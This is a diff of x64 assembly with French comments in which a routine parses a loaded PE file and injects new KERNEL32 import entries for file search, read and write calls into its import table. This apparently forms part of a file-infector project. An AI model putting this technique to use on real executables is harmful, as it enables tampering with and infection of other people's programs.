@@ -524,6 +524,8 @@ ft_strncpy endp
 
 ft_memcpy proc ; char *strncpy(char *dest, const char *src, size_t n);
 	push rbp
+	push r9
+	push rcx
 	mov rbp, rsp
 
 	xor rax, rax
@@ -541,6 +543,9 @@ ft_memcpy proc ; char *strncpy(char *dest, const char *src, size_t n);
 	fin_boucle_memcpy:
 	mov rax, r9
 	mov rsp, rbp
+
+	pop rcx
+	pop r9
 	pop rbp
 	ret
 ft_memcpy endp
@@ -590,6 +595,8 @@ stop_ft_strequ_not_equal:
 ft_strequ endp
 
 ; rbp
+; 80 - 88	: Unused
+; 72 - 80	: FirstThunk
 ; 64 - 72   : Virtual Address de idata
 ; 56 - 64	: PointerToRawData de idata
 ; 48 - 56	: tmp storage for rax
@@ -600,10 +607,22 @@ ft_strequ endp
 
 KERNEL_32_DLL_NAME db 'KERNEL32.dll',0h
 
+FindFirstFileA_NAME db 01h, 7dh, 'FindFirstFileA',0h
+FindNextFileA_NAME	db 01h, 8eh, 'FindNextFileA',0h
+ReadFile_NAME		db 04h, 70h, 'ReadFile',0h
+CreateFileA_NAME	db 00h, 0c2h,'CreateFileA',0h
+GetFileSize_NAME	db 02h, 4eh, 'GetFileSize',0h
+SetFilePointer_NAME	db 05h, 28h, 'SetFilePointer',0h
+WriteFile_NAME		db 06h, 19h, 'WriteFile',0h
+GetProcessHeap_NAME	db 02h, 0b7h,'GetProcessHeap',0h
+HeapAlloc_NAME		db 03h, 4ah, 'HeapAlloc',0h
+
+COUNT db 17, 16, 11, 14, 14, 17, 12, 17, 12
+
 init_imports proc ; void init_imports(void *fichier, int taille_du_ficher)
 	push rbp
 	mov rbp, rsp
-	sub rsp, 72
+	sub rsp, 88
 
 	mov qword ptr [rsp + 32], rcx
 	mov qword ptr [rsp + 40], rdx ; on sauvegarde les parametres
@@ -657,6 +676,47 @@ debut_boucle_init_imports_find_kernel32:
 
 
 fin_boucle_init_imports_find_kernel32:
+
+	mov rax, qword ptr [rsp + 48]
+	sub rax, 0ch
+	xor rbx, rbx
+	mov ebx, dword ptr [rax]
+	sub rbx, qword ptr [rsp + 64]
+	add rbx, qword ptr [rsp + 56]
+	add rbx, qword ptr [rsp + 32] ; on transforme la rva en file offset puis on ajoute l'adresse memoire
+
+	xor rcx, rcx
+	mov ecx, dword ptr [rbx]
+	sub rcx, qword ptr [rsp + 64]
+	add rcx, qword ptr [rsp + 56]
+	add rcx, qword ptr [rsp + 32] ; on transforme la rva en file offset puis on ajoute l'adresse memoire
+
+grande_boucle_init_imports:
+	add rcx, 2
+	cmp byte ptr [rcx], 0
+	je grande_boucle_init_imports_fin
+	inc rcx
+petite_boucle_init_imports:
+	inc rcx
+	cmp byte ptr [rcx - 1], 0
+	je grande_boucle_init_imports
+	jmp petite_boucle_init_imports
+
+grande_boucle_init_imports_fin:
+
+
+	; Destination deja dans rcx la premiere fois
+	lea rdx, FindFirstFileA_NAME
+	mov r8, 130
+	call ft_memcpy
+
+debut_boucle_oft_trouver_fin: ; RBX doit etre l'adresse de la premiere entree de l'oft
+	cmp dword ptr [rbx], 0
+	je fin_boucle_oft_trouver_oft
+	add rbx, 8
+	jmp debut_boucle_oft_trouver_fin
+fin_boucle_oft_trouver_oft:
+
 	
 	mov rsp, rbp
 	pop rbp
